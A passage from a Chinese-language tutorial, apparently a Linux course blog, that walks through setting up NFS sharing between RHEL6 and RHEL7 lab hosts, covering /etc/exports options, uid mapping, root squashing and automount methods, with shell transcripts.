<td align="left">客户端</td>
</tr>
</tbody></table>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel6 ~]# yum install -y nfs-utils rpcbind</span><br><span class="line">Loaded plugins: product-id, refresh-packagekit, security, subscription-manager</span><br><span class="line">This system is not registered to Red Hat Subscription Management. You can use subscription-manager to register.</span><br><span class="line">server                                                                                    | 3.9 kB     00:00     </span><br><span class="line">server/primary_db                                                                         | 3.1 MB     00:00     </span><br><span class="line">Setting up Install Process</span><br><span class="line">Package 1:nfs-utils-1.2.3-39.el6.x86_64 already installed and latest version</span><br><span class="line">Package rpcbind-0.2.0-11.el6.x86_64 already installed and latest version</span><br><span class="line">Nothing to do</span><br></pre></td></tr></table></figure>
<p>rpcbind</p>
<ul>
<li>rpc:管理客户端和服务端的ip和端口号—连接</li>
<li>remote    procedure call——远程过程调用协议</li>
</ul>
<p>nfs-utils</p>
<ul>
<li>nfs:传输数据</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel6 ~]# rpm -qf /etc/exports</span><br><span class="line">setup-2.8.14-20.el6_4.1.noarch</span><br><span class="line">[root@rhel6 ~]# rpm -ql rpcbind</span><br><span class="line">/etc/rc.d/init.d/rpcbind</span><br><span class="line">/sbin/rpcbind</span><br><span class="line">/usr/sbin/rpcinfo</span><br><span class="line">/usr/share/doc/rpcbind-0.2.0</span><br><span class="line">/usr/share/doc/rpcbind-0.2.0/AUTHORS</span><br><span class="line">/usr/share/doc/rpcbind-0.2.0/ChangeLog</span><br><span class="line">/usr/share/doc/rpcbind-0.2.0/README</span><br><span class="line">/usr/share/man/man8/rpcbind.8.gz</span><br><span class="line">/usr/share/man/man8/rpcinfo.8.gz</span><br><span class="line">/var/cache/rpcbind</span><br><span class="line">[root@rhel6 ~]# rpm -ql nfs-utils</span><br><span class="line">/etc/nfsmount.conf</span><br><span class="line">/etc/rc.d/init.d/nfs</span><br><span class="line">/etc/rc.d/init.d/nfslock</span><br><span class="line">/etc/rc.d/init.d/rpcgssd</span><br><span class="line">/etc/rc.d/init.d/rpcidmapd</span><br><span class="line">/etc/rc.d/init.d/rpcsvcgssd</span><br><span class="line">/etc/request-key.d/id_resolver.conf</span><br><span class="line">/etc/sysconfig/nfs</span><br><span class="line">/sbin/mount.nfs</span><br><span class="line">/sbin/mount.nfs4</span><br><span class="line">/sbin/nfs_cache_getent</span><br><span class="line">/sbin/rpc.statd</span><br><span class="line">/sbin/umount.nfs</span><br><span class="line">/sbin/umount.nfs4</span><br><span class="line">/usr/sbin/exportfs</span><br><span class="line">/usr/sbin/mountstats</span><br><span class="line">/usr/sbin/nfsidmap</span><br><span class="line">/usr/sbin/nfsiostat</span><br><span class="line">/usr/sbin/nfsstat</span><br><span class="line">/usr/sbin/rpc.gssd</span><br><span class="line">/usr/sbin/rpc.idmapd</span><br><span class="line">/usr/sbin/rpc.mountd</span><br><span class="line">/usr/sbin/rpc.nfsd</span><br><span class="line">/usr/sbin/rpc.svcgssd</span><br><span class="line">/usr/sbin/rpcdebug</span><br><span class="line">/usr/sbin/showmount</span><br><span class="line">/usr/sbin/sm-notify</span><br><span class="line">/usr/sbin/start-statd</span><br><span class="line">/usr/share/doc/n7/nfsd.7.gz</span><br><span class="line">... ...</span><br><span class="line">/var/lib/nfs</span><br><span class="line">/var/lib/nfs/etab</span><br><span class="line">/var/lib/nfs/rmtab</span><br><span class="line">/var/lib/nfs/rpc_pipefs</span><br><span class="line">/var/lib/nfs/statd</span><br><span class="line">/var/lib/nfs/statd/sm</span><br><span class="line">/var/lib/nfs/statd/sm.bak</span><br><span class="line">/var/lib/nfs/state</span><br><span class="line">/var/lib/nfs/v4recovery</span><br><span class="line">/var/lib/nfs/xtab</span><br></pre></td></tr></table></figure>

<blockquote>
<p>修改配置文件</p>
</blockquote>
<p><strong>主配置文件</strong> <code>/etc/exports</code></p>
<p><strong>服务名</strong> <code>rpcbind</code> <code>nfs</code></p>
<p>根据要求，允许172.25.X.10这个客户端来挂接使用/tmp目录，有读写权限。配置<code>/etc/exports</code>内容为<code>/tmp 172.25.0.10(rw)</code>后，根据服务名来打开相应的服务</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel6 ~]# vim /etc/exports</span><br><span class="line">[root@rhel6 ~]# cat /etc/exports</span><br><span class="line">/tmp 172.25.0.10(rw)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>启动服务</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel6 ~]# service rpcbind start</span><br><span class="line">[root@rhel6 ~]# service nfs start</span><br><span class="line">Starting NFS services:                                     [  OK  ]</span><br><span class="line">Starting NFS quotas:                                       [  OK  ]</span><br><span class="line">Starting NFS mountd:                                       [  OK  ]</span><br><span class="line">Starting NFS daemon:                                       [  OK  ]</span><br><span class="line">Starting RPC idmapd:                                       [  OK  ]</span><br><span class="line">[root@rhel6 ~]# netstat -luntp |grep rpcbind</span><br><span class="line">tcp        0      0 0.0.0.0:111                 0.0.0.0:*                   LISTEN      1174/rpcbind        </span><br><span class="line">tcp        0      0 :::111                      :::*                        LISTEN      1174/rpcbind        </span><br><span class="line">udp        0      0 0.0.0.0:111                 0.0.0.0:*                               1174/rpcbind        </span><br><span class="line">udp        0      0 0.0.0.0:925                 0.0.0.0:*                               1174/rpcbind        </span><br><span class="line">udp        0      0 :::111                      :::*                                    1174/rpcbind        </span><br><span class="line">udp        0      0 :::925                      :::*                                    1174/rpcbind        </span><br><span class="line">[root@rhel6 ~]# netstat -luntp |grep nfs</span><br><span class="line">[root@rhel6 ~]# ps -ef|grep nfs</span><br><span class="line">root      1888     2  0 15:20 ?        00:00:00 [nfsd4]</span><br><span class="line">root      1889     2  0 15:20 ?        00:00:00 [nfsd4_callbacks]</span><br><span class="line">root      1890     2  0 15:20 ?        00:00:00 [nfsd]</span><br><span class="line">root      1891     2  0 15:20 ?        00:00:00 [nfsd]</span><br><span class="line">root      1892     2  0 15:20 ?        00:00:00 [nfsd]</span><br><span class="line">root      1893     2  0 15:20 ?        00:00:00 [nfsd]</span><br><span class="line">root      1894     2  0 15:20 ?        00:00:00 [nfsd]</span><br><span class="line">root      1895     2  0 15:20 ?        00:00:00 [nfsd]</span><br><span class="line">root      1896     2  0 15:20 ?        00:00:00 [nfsd]</span><br><span class="line">root      1897     2  0 15:20 ?        00:00:00 [nfsd]</span><br><span class="line">root      1928  1745  0 15:20 pts/0    00:00:00 grep nfs</span><br><span class="line">[root@rhel6 ~]# service iptables stop</span><br><span class="line">iptables: Setting chains to policy ACCEPT: filter          [  OK  ]</span><br><span class="line">iptables: Flushing firewall rules:                         [  OK  ]</span><br><span class="line">iptables: Unloading modules:                               [  OK  ]</span><br></pre></td></tr></table></figure>

<p><strong>守护进程daemon</strong> <code>rpcbind</code> <code>nfsd</code></p>
<p><strong>监听端口号</strong> 111 925</p>
<blockquote>
<p>客户端测试使用</p>
</blockquote>
<p>查看服务器共享目录的情况 <code>showmount -e 172.25.0.11</code></p>
<p>远程挂载 <code>mount 172.25.0.10:/tmp /mnt</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel7 ~]# yum install -y nfs-utils rpcbind</span><br><span class="line">Loaded plugins: langpacks, product-id, subscription-manager</span><br><span class="line">This system is not registered to Red Hat Subscription Management. You can use subscription-manager to register.</span><br><span class="line">Package 1:nfs-utils-1.3.0-0.el7.x86_64 already installed and latest version</span><br><span class="line">Package rpcbind-0.2.0-23.el7.x86_64 already installed and latest version</span><br><span class="line">Nothing to do</span><br><span class="line">[root@rhel7 ~]# showmount -e 172.25.0.11</span><br><span class="line">Export list for 172.25.0.11:</span><br><span class="line">/tmp 172.25.0.10</span><br><span class="line">[root@rhel7 ~]# mount 172.25.0.11:/tmp /mnt</span><br><span class="line">[root@rhel7 ~]# mount |tail -n 1</span><br><span class="line">172.25.0.11:/tmp on /mnt type nfs4 (rw,relatime,vers=4.0,rsize=131072,wsize=131072,namlen=255,hard,proto=tcp,port=0,timeo=600,retrans=2,sec=sys,clientaddr=172.25.0.10,local_lock=none,addr=172.25.0.11)</span><br><span class="line">[root@rhel7 mnt]# touch rhel7test</span><br><span class="line">[root@rhel7 mnt]# ll</span><br><span class="line">total 12</span><br><span class="line">drwx------. 2 gdm       gdm       4096 Sep 25 02:59 orbit-gdm</span><br><span class="line">drwx------. 2 root      root      4096 Jul  2  2015 pulse-oCBy0hGD1JT6</span><br><span class="line">drwx------. 2 gdm       gdm       4096 Sep 25 02:59 pulse-q5sECpImz7Ju</span><br><span class="line">-rw-r--r--. 1 nfsnobody nfsnobody    0 Sep 25  2016 rhel7test</span><br><span class="line">[root@rhel7 mnt]# cd</span><br><span class="line">[root@rhel7 ~]# umount /mnt</span><br></pre></td></tr></table></figure>
<p><strong>nfsnobody</strong> 以 root 用户创建的文件被映射成 nfsnobody 用户 , 因为在服务器上没有指定 no_root_squash</p>
<blockquote>
<p>将读写权限改成只读权限；(ro)</p>
</blockquote>
<p>服务器端修改配置文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel6 ~]# vim /etc/exports</span><br><span class="line">[root@rhel6 ~]# cat /etc/exports</span><br><span class="line">/tmp 172.25.0.10(ro)</span><br><span class="line">[root@rhel6 ~]# service rpcbind restart</span><br><span class="line">Stopping rpcbind:                                          [  OK  ]</span><br><span class="line">Starting rpcbind:                                          [  OK  ]</span><br><span class="line">[root@rhel6 ~]# service nfs restart</span><br><span class="line">Shutting down NFS daemon:                                  [  OK  ]</span><br><span class="line">Shutting down NFS mountd:                                  [  OK  ]</span><br><span class="line">Shutting down NFS quotas:                                  [  OK  ]</span><br><span class="line">Shutting down NFS services:                                [  OK  ]</span><br><span class="line">Shutting down RPC idmapd:                                  [  OK  ]</span><br><span class="line">Starting NFS services:                                     [  OK  ]</span><br><span class="line">Starting NFS quotas:                                       [  OK  ]</span><br><span class="line">Starting NFS mountd:                                       [  OK  ]</span><br><span class="line">Starting NFS daemon:                                       [  OK  ]</span><br><span class="line">Starting RPC idmapd:                                       [  OK  ]</span><br></pre></td></tr></table></figure>

<p>客户端rhel7</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel7 ~]# mount 172.25.0.11:/tmp /mnt</span><br><span class="line">[root@rhel7 ~]# touch /mnt/rhel7test2</span><br><span class="line">touch: cannot touch ‘/mnt/rhel7test2’: Read-only file system</span><br><span class="line">[root@rhel7 ~]# umount /mnt</span><br></pre></td></tr></table></figure>

<blockquote>
<p>允许172.25.X.0/24网段挂接/tmp目录，有读写权限；</p>
</blockquote>
<p>修改配置文件为 <code>/tmp 172.25.0.0/24(rw)</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel6 ~]# vim /etc/exports</span><br><span class="line">[root@rhel6 ~]# cat /etc/exports</span><br><span class="line">/tmp 172.25.0.0/24(rw)</span><br><span class="line">[root@rhel6 ~]# service rpcbind restart</span><br><span class="line">Stopping rpcbind:                                          [  OK  ]</span><br><span class="line">Starting rpcbind:                                          [  OK  ]</span><br><span class="line">[root@rhel6 ~]# service nfs restart</span><br><span class="line">Shutting down NFS daemon:                                  [  OK  ]</span><br><span class="line">Shutting down NFS mountd:                                  [  OK  ]</span><br><span class="line">Shutting down NFS quotas:                                  [  OK  ]</span><br><span class="line">Shutting down NFS services:                                [  OK  ]</span><br><span class="line">Shutting down RPC idmapd:                                  [  OK  ]</span><br><span class="line">Starting NFS services:                                     [  OK  ]</span><br><span class="line">Starting NFS quotas:                                       [  OK  ]</span><br><span class="line">Starting NFS mountd:                                       [  OK  ]</span><br><span class="line">Starting NFS daemon:                                       [  OK  ]</span><br><span class="line">Starting RPC idmapd:                                       [  OK  ]</span><br></pre></td></tr></table></figure>

<blockquote>
<p>分别在客户端和服务器上都创建一个id=1200的用户tom，在客户端用tom用户新建一个文件rhel7tomfile，并查看属性，再到服务器上去查看该文件的属性；在服务器上用tom用户去创建rhel6tomfile，查看属性，再到客户端上查看属性。</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 服务端rhel6</span></span><br><span class="line">[root@rhel6 ~]# useradd -u 1200 tom</span><br><span class="line">[root@rhel6 ~]# echo uplooking|passwd --stdin tom</span><br><span class="line">Changing password for user tom.</span><br><span class="line">passwd: all authentication tokens updated successfully.</span><br><span class="line">[root@rhel6 ~]# su - tom</span><br><span class="line">[tom@rhel6 ~]$ touch /tmp/tomfile</span><br><span class="line">[tom@rhel6 ~]$ ll /tmp/tomfile</span><br><span class="line">-rw-rw-r--. 1 tom tom 0 Sep 25 15:55 /tmp/tomfile</span><br><span class="line">[tom@rhel6 tmp]$ touch rhel6tomfile</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 客户端rhel7</span></span><br><span class="line">[tom@rhel7 mnt]$ touch rhel7tomfile</span><br><span class="line">[tom@rhel7 mnt]$ ll</span><br><span class="line">total 12</span><br><span class="line">-rw-rw-r--. 1 nobody nobody    0 Sep 25 04:03 4913</span><br><span class="line">drwx------. 2 gdm    gdm    4096 Sep 25 02:59 orbit-gdm</span><br><span class="line">drwx------. 2 root   root   4096 Jul  2  2015 pulse-oCBy0hGD1JT6</span><br><span class="line">drwx------. 2 gdm    gdm    4096 Sep 25 02:59 pulse-q5sECpImz7Ju</span><br><span class="line">-rw-rw-r--. 1 nobody nobody    0 Sep 25 04:07 rhel7tomfile</span><br><span class="line">-rw-rw-r--. 1 nobody nobody    0 Sep 25 04:06 tomfile</span><br><span class="line">[tom@rhel7 mnt]$ rm -rf rhel7tomfile</span><br><span class="line">rm: cannot remove ‘rhel7tomfile’: Operation not permitted</span><br><span class="line">[tom@rhel7 mnt]$ rm -rf rhel6tomfile</span><br><span class="line">rm: cannot remove ‘rhel6tomfile’: Operation not permitted</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 服务端rhel6</span></span><br><span class="line">[tom@rhel6 tmp]$ ll</span><br><span class="line">total 12</span><br><span class="line">-rw-rw-r--. 1 tom  tom     0 Sep 25 16:03 4913</span><br><span class="line">drwx------. 2 gdm  gdm  4096 Sep 25 14:59 orbit-gdm</span><br><span class="line">drwx------. 2 root root 4096 Jul  2  2015 pulse-oCBy0hGD1JT6</span><br><span class="line">drwx------. 2 gdm  gdm  4096 Sep 25 14:59 pulse-q5sECpImz7Ju</span><br><span class="line">-rw-rw-r--. 1 tom  tom     0 Sep 25 16:10 rhel6tomfile</span><br><span class="line">-rw-rw-r--. 1 tom  tom     0 Sep 25 16:07 rhel7tomfile</span><br></pre></td></tr></table></figure>

<p>两个新文件在客户端均显示属于nobody，而在服务器端显示属于tom用户，并且会发现在客户端由tom用户创建出来的文件也没有办法删除。</p>
<p>这是由于当前服务器版本比客户端低的缘故。</p>
<p>如果将rhel7作为服务端，rhel6作为客户端，就不会出现上述问题了。如下所示：</p>
<table>
<thead>
<tr>
<th align="left">主机名</th>
<th align="left">ip地址</th>
<th align="left">软件</th>
<th align="left">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="left">rhel6</td>
<td align="left">172.25.0.11</td>
<td align="left">rpcbind nfs-utils</td>
<td align="left">客户端</td>
</tr>
<tr>
<td align="left">rhel7</td>
<td align="left">172.25.0.10</td>
<td align="left">rpcbind nfs-utils</td>
<td align="left">服务端</td>
</tr>
</tbody></table>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 服务端rhel7</span></span><br><span class="line">[root@rhel7 ~]# vim /etc/exports</span><br><span class="line">[root@rhel7 ~]# systemctl stop firewalld</span><br><span class="line">[root@rhel7 ~]# systemctl start rpcbind</span><br><span class="line">[root@rhel7 ~]# systemctl start nfs</span><br><span class="line"><span class="meta">#</span><span class="bash"> 客户端rhel6</span></span><br><span class="line">[root@rhel6 tmp]# mount 172.25.0.10:/tmp /mnt</span><br><span class="line">[root@rhel6 tmp]# cd /mnt</span><br><span class="line">[tom@rhel6 mnt]$ touch rhel6tomfile</span><br><span class="line">[tom@rhel6 mnt]$ ll</span><br><span class="line">total 0</span><br><span class="line">-rw-rw-r--. 1 tom  tom   0 Sep 25 16:22 rhel6tomfile</span><br><span class="line">drwx------. 3 root root 16 Sep 25 14:59 systemd-private-hPL7GQ</span><br><span class="line">drwx------. 3 root root 16 Sep 25 14:58 systemd-private-jFcaMN</span><br><span class="line"><span class="meta">#</span><span class="bash"> 服务端rhel7</span></span><br><span class="line">[tom@rhel7 tmp]$ touch rhel7tomfile</span><br><span class="line">[tom@rhel7 tmp]$ ll</span><br><span class="line">total 0</span><br><span class="line">-rw-rw-r--. 1 tom  tom   0 Sep 25 04:22 rhel6tomfile</span><br><span class="line">-rw-rw-r--. 1 tom  tom   0 Sep 25 04:24 rhel7tomfile</span><br><span class="line">drwx------. 3 root root 16 Sep 25 02:59 systemd-private-hPL7GQ</span><br><span class="line">drwx------. 3 root root 16 Sep 25 02:58 systemd-private-jFcaMN</span><br><span class="line"><span class="meta">#</span><span class="bash"> 客户端rhel6</span></span><br><span class="line">[tom@rhel6 mnt]$ ll</span><br><span class="line">total 0</span><br><span class="line">-rw-rw-r--. 1 tom  tom   0 Sep 25 16:22 rhel6tomfile</span><br><span class="line">-rw-rw-r--. 1 tom  tom   0 Sep 25 16:24 rhel7tomfile</span><br><span class="line">drwx------. 3 root root 16 Sep 25 14:59 systemd-private-hPL7GQ</span><br><span class="line">drwx------. 3 root root 16 Sep 25 14:58 systemd-private-jFcaMN</span><br><span class="line">[tom@rhel6 mnt]$ rm -rf rhel6tomfile</span><br><span class="line">[tom@rhel6 mnt]$ rm -rf rhel7tomfile</span><br><span class="line">[tom@rhel6 mnt]$ ll</span><br><span class="line">total 0</span><br><span class="line">drwx------. 3 root root 16 Sep 25 14:59 systemd-private-hPL7GQ</span><br><span class="line">drwx------. 3 root root 16 Sep 25 14:58 systemd-private-jFcaMN</span><br></pre></td></tr></table></figure>

<p><strong>文件所属者和所属组是根据uid和gid来匹配的。</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 服务器rhel7</span></span><br><span class="line">[root@rhel7 ~]# useradd -u 1003 batman</span><br><span class="line">[root@rhel7 ~]# echo uplooking|passwd --stdin batman</span><br><span class="line">Changing password for user batman.</span><br><span class="line">passwd: all authentication tokens updated successfully.</span><br><span class="line">[root@rhel7 ~]# id batman</span><br><span class="line">uid=1003(batman) gid=1003(batman) groups=1003(batman)</span><br><span class="line">[root@rhel7 ~]# su batman</span><br><span class="line">[batman@rhel7 root]$ cd /tmp</span><br><span class="line">[batman@rhel7 tmp]$ ll</span><br><span class="line">total 0</span><br><span class="line">drwx------. 3 root root 16 Sep 25 02:59 systemd-private-hPL7GQ</span><br><span class="line">drwx------. 3 root root 16 Sep 25 02:58 systemd-private-jFcaMN</span><br><span class="line">[batman@rhel7 tmp]$ touch rhel7batmanfile</span><br><span class="line">[batman@rhel7 tmp]$ ll</span><br><span class="line">total 0</span><br><span class="line">-rw-rw-r--. 1 batman batman  0 Sep 25 04:27 rhel7batmanfile</span><br><span class="line">drwx------. 3 root   root   16 Sep 25 02:59 systemd-private-hPL7GQ</span><br><span class="line">drwx------. 3 root   root   16 Sep 25 02:58 systemd-private-jFcaMN</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@rhel6 mnt]# ll</span><br><span class="line">total 0</span><br><span class="line">-rw-rw-r--. 1 1003 1003  0 Sep 25 16:27 rhel7batmanfile</span><br><span class="line">drwx------. 3 root root 16 Sep 25 14:59 systemd-private-hPL7GQ</span><br><span class="line">drwx------. 3 root root 16 Sep 25 14:58 systemd-private-jFcaMN</span><br><span class="line">[root@rhel6 mnt]# useradd -u 1003 superman</span><br><span class="line">[root@rhel6 mnt]# echo uplooking|passwd --stdin superman</span><br><span class="line">Changing password for user superman.</span><br><span class="line">passwd: all authentication tokens updated successfully.</span><br><span class="line">[root@rhel6 mnt]# ll</span><br><span class="line">total 0</span><br><span class="line">-rw-rw-r--. 1 superman superman  0 Sep 25 16:27 rhel7batmanfile</span><br><span class="line">drwx------. 3 root     root     16 Sep 25 14:59 systemd-private-hPL7GQ</span><br><span class="line">drwx------. 3 root     root     16 Sep 25 14:58 systemd-private-jFcaMN</span><br><span class="line">[root@rhel6 mnt]# su  superman</span><br><span class="line">[superman@rhel6 mnt]$ ll</span><br><span class="line">total 0</span><br><span class="line">-rw-rw-r--. 1 superman superman  0 Sep 25 16:27 rhel7batmanfile</span><br><span class="line">drwx------. 3 root     root     16 Sep 25 14:59 systemd-private-hPL7GQ</span><br><span class="line">drwx------. 3 root     root     16 Sep 25 14:58 systemd-private-jFcaMN</span><br><span class="line">[superman@rhel6 mnt]$ rm -rf rhel7batmanfile</span><br><span class="line">[superman@rhel6 mnt]$ ll</span><br><span class="line">total 0</span><br><span class="line">drwx------. 3 root root 16 Sep 25 14:59 systemd-private-hPL7GQ</span><br><span class="line">drwx------. 3 root root 16 Sep 25 14:58 systemd-private-jFcaMN</span><br></pre></td></tr></table></figure>

<p>在服务器上以 batman 用户创建的文件被映射成客户端的 superman 用户 , 因为在服务器上 batman 的 id 与 superman 的 id 相同</p>
<blockquote>
<p>为什么不建议使用(rw,no_root_squash)</p>
</blockquote>
<p><strong>面试题</strong></p>
<ol>
<li>客户说为什么我是root，却不能删除root的文件呢（前提是该文件是nfs服务挂接使用的）？</li>
</ol>
<ul>
<li>1）考虑到安全，当前我们nfs的配置中就设置为本地的root用户是没有权限删除服务器端的root用户文件的。</li>
<li>2）如果客户你一定要去有这个权限，那么你可以修改配置，添加一个no_root_squash；不建议这么做。</li>
</ul>
<ol start="2">
<li>客户电话咨询说服务器出故障了，</li>
</ol>
<ul>
<li>1）挂接目录执行任何操作就卡死了，然后我重启，就卡在哪里了，/mnt</li>
<li>2）前一天还正常，今天上班开不了机了</li>
<li>3）mount查看当前挂接目录，卡在哪里，杀掉进程，再mount还是卡在那里</li>
</ul>
<p>以上都有可能是nfs服务器连接出现问题了，应该去检查一下nfs服务器的运行情况。再排错。</p>
<h3 id="配置文件详解"><a href="#配置文件详解" class="headerlink" title="配置文件详解"></a>配置文件详解</h3><h4 id="主配置文件-etc-exports"><a href="#主配置文件-etc-exports" class="headerlink" title="主配置文件/etc/exports"></a>主配置文件/etc/exports</h4><p>关于exports的写法，我们可以通过  <code>man 5 exports</code> 来查看 <code>EXAMPLES</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> sample /etc/exports file</span></span><br><span class="line"><span class="meta">#</span><span class="bash">      共享目录             客户端列表（权限）</span></span><br><span class="line">       /               master(rw) trusty(rw,no_root_squash)</span><br><span class="line">       /projects       proj*.local.domain(rw)</span><br><span class="line">       /usr            *.local.domain(ro) @trusted(rw)</span><br><span class="line">       /home/joe       pc001(rw,all_squash,anonuid=150,anongid=100)</span><br><span class="line">       /pub            *(ro,insecure,all_squash)</span><br><span class="line">       /srv/www        -sync,rw server @trusted @external(ro)</span><br><span class="line">       /foo            2001:db8:9:e54::/64(rw) 192.0.2.0/24(rw)</span><br><span class="line">       /build          buildhost[0-9].local.domain(rw)</span><br></pre></td></tr></table></figure>

<p>详细参数解释如下表所示：</p>
<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">rw</td>
<td align="left">可读可写</td>
</tr>
<tr>
<td align="left">ro</td>
<td align="left">只读</td>
</tr>
<tr>
<td align="left">sync</td>
<td align="left">数据同步写入内存缓冲区与磁盘中，虽然这样做效率较低，但可以保证数据的一致性（适合于小文件传输）</td>
</tr>
<tr>
<td align="left">async</td>
<td align="left">数据先暂时放于内存，而非直接写入硬盘，等到必要时才写入磁盘（适合于大文件传输）</td>
</tr>
<tr>
<td align="left">no_root_squash</td>
<td align="left">使用nfs时，如果用户是root，不进行权限压缩，即root用户在nfs上创建的文件   属组和属主仍然是root（不安全，不建议使用）</td>
</tr>
<tr>
<td align="left">root_squash</td>
<td align="left">使用nfs时，如果用户是root，则进行权限压缩，即把root用户在nfs上创建的文件   属组和属主修改为nfsnobody</td>
</tr>
<tr>
<td align="left">all_squash</td>
<td align="left">所有的普通用户使用nfs都将使用权限压缩，即：将远程访问的所有普通用户及所属用户组都映射为匿名用户或者用户组（一般均为nfsnobody）</td>
</tr>
<tr>
<td align="left">no_all_squash</td>
<td align="left">所有的普通用户使用nfs都不使用权限压缩，即：不将远程访问的所有普通用户及所属用户组都映射为匿名用户或者用户组（默认设置）</td>
</tr>
<tr>
<td align="left">anonuid=XXX</td>
<td align="left">anon即anonymous(匿名者)，前面关于*_squash提到的匿名用户的uid的设置值，通常为nobody或者nfsnobody，使用这个参数可以自行设定这个uid值，这个uid必须存在 于/etc/passwd</td>
</tr>
<tr>
<td align="left">anongid=XXX</td>
<td align="left">将远程访问的所有用户组都映身为匿名用户组账户，并指定该匿名用户组账户为本地用户组账户（GID=XXX）</td>
</tr>
<tr>
<td align="left">insecure</td>
<td align="left">允许客户端从大于1024的TCP/IP端口连NFS服务器</td>
</tr>
<tr>
<td align="left">secure</td>
<td align="left">限制客户端只能从小于1024的TCP/IP端口连接NFS服务器(默认设置)</td>
</tr>
<tr>
<td align="left">wdelay</td>
<td align="left">检查是否有相关的写操作，如果有则将这些写操作一起执行，这样可提高效率(默认设置)</td>
</tr>
<tr>
<td align="left">no_wdelay</td>
<td align="left">若有写操作则立即执行（应与sync配置）</td>
</tr>
<tr>
<td align="left">subtree_check</td>
<td align="left">若输出目录是一个子目录，则NFSW:务器将检查其父目录的权限(默认设置)</td>
</tr>
<tr>
<td align="left">no_subtree_check</td>
<td align="left">即使输出目录是一个子目录，NFS服务器也不检查其父目录的权限，这样做可提高效率</td>
</tr>
</tbody></table>
<p><strong>设置实例</strong></p>
<p><code>/tmp *(rw,no_root_squash)</code></p>
<p>在所有的IP（主机）上登录的用户都可对NFS服务器上的共享目录/tmp拥有rw操作权限，同时如果是root用户访问该共享目录，那么不将root用户及所属用户组都映射为匿名用户或用户组（*表示所有的主机或者IP）</p>
<p><code>/tmp *(rw)</code></p>
<p>在所有的IP（主机）登录的用户都可对NFS服务器上的共享目录/tmp拥有rw操作权限</p>
<p><code>/home/public 192.168.0.*(rw)   *(ro)</code>  或者 <code>/home/public 192.168.0.0/24(rw) *(ro)</code></p>
<p>除了在<code>192. 168. 0.0/24</code>这个网段内的主机上登录的用户，可对NFS服务器共享目录<code>/home/public</code>进行<code>rw</code>操作权限，而其它网段的主机上登录的用户，对NFS服务器共享目录<code>/home/public</code>只能进行<code>r</code>操作</p>
<p><code>/home/test 192.168.0.100(rw)</code></p>
<p>只对<code>192.168.0.100</code>该台主机设置权限，即：使在该台主机登录的用户都可对NFS服务器上的共享目录<code>/home/test</code>拥有读与写的操作</p>
<p><code>/home/linux *.linux.org(rw,all_squash,anonuid=40,anongid=40)</code></p>
<p>当<code>*.linux.org</code>（加入域<code>linux.org</code>的所有主机） 登陆此NFS主机，并且在<code>/home/linux</code>下面写入档案时，该档案的所有人与所有组，就会变成NFS服务器上的<code>/etc/passwd</code>文件里面对应的<code>UID</code>为40的那个身份的使用者了（因为指定了参数：<code>all_squash，anonuid=40，anongid=40</code>）</p>
<hr>
<h3 id="项目实践2：自动挂接NFS"><a href="#项目实践2：自动挂接NFS" class="headerlink" title="项目实践2：自动挂接NFS"></a>项目实践2：自动挂接NFS</h3><p>要求分别通过下面三种方法实现自动挂接<br>    *    /etc/fstab（容易出问题）<br>    * /etc/bashrc<br>    * autofs服务</p>
<h4 id="etc-fstab"><a href="#etc-fstab" class="headerlink" title="/etc/fstab"></a>/etc/fstab</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel6 ~]# vim /etc/fstab</span><br><span class="line">172.25.0.10:/tmp        /mnt                    nfs     defaults        0 0</span><br><span class="line">[root@rhel6 ~]# mount -a</span><br><span class="line">[root@rhel6 ~]# mount |tail -n 1</span><br><span class="line">172.25.0.10:/tmp on /mnt type nfs (rw,vers=4,addr=172.25.0.10,clientaddr=172.25.0.11)</span><br></pre></td></tr></table></figure>

<p>如果nfs服务器出现问题，导致客户端无法挂接，此时就会出现开机启动失败的情况。因此不建议这么做。</p>
<h4 id="etc-bashrc"><a href="#etc-bashrc" class="headerlink" title="/etc/bashrc"></a>/etc/bashrc</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel6 ~]# vim /etc/bashrc</span><br><span class="line">[root@rhel6 ~]# grep mount /etc/bashrc</span><br><span class="line">mount 172.25.0.10:/tmp /mnt</span><br><span class="line">[root@rhel6 ~]# reboot</span><br><span class="line"></span><br><span class="line">Broadcast message from root@rhel6</span><br><span class="line">	(/dev/pts/0) at 16:53 ...</span><br><span class="line"></span><br><span class="line">The system is going down for reboot NOW!</span><br><span class="line">[root@rhel6 ~]# Connection to 172.25.0.11 closed by remote host.</span><br><span class="line">Connection to 172.25.0.11 closed.</span><br><span class="line">[root@foundation0 ~]# ssh root@172.25.0.11</span><br><span class="line">Last login: Sun Sep 25 16:52:03 2016 from 172.25.0.250</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mount.nfs: Connection timed out</span><br></pre></td></tr></table></figure>

<p>如果将挂接的命令放在开机启动后的终端启动脚本中，那么只会有一个报错而已。</p>
